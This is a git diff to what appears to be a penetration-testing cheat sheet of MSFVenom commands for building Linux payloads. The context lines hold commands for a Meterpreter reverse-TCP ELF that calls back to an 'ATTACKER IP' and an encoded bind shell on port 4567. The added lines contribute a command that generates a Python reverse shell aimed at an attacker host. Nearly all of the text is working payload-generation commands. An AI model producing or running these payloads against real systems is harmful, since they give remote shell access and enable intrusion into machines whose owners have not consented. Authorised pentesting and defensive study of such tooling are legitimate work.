@@ -21,6 +21,10 @@ This section is for all LINUX binary creation techniques used with MSFVenom
 `./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=5555 -a x86 --platform=linux -f elf -b '\x00' -o shell.o`
 ### Bind Shell Port 4567
 `./msfvenom --platform=linux --payload=linux/x86/shell_bind_tcp -e x86/shikata_ga_nai -b '\x00' -f elf LPORT=4567 > LinBind4567.elf`
+### Python Stand Alone CMD
+This will create a file with the Python command to run from your remote shell.
+
+`msfvenom -p cmd/unix/reverse_python LHOST=(ATTACKER IP ADDRESS) LPORT=(LOCAL PORT) -f raw > RevBind443.py` 
 
 ## JAVA TOMCAT
 ### .WAR File
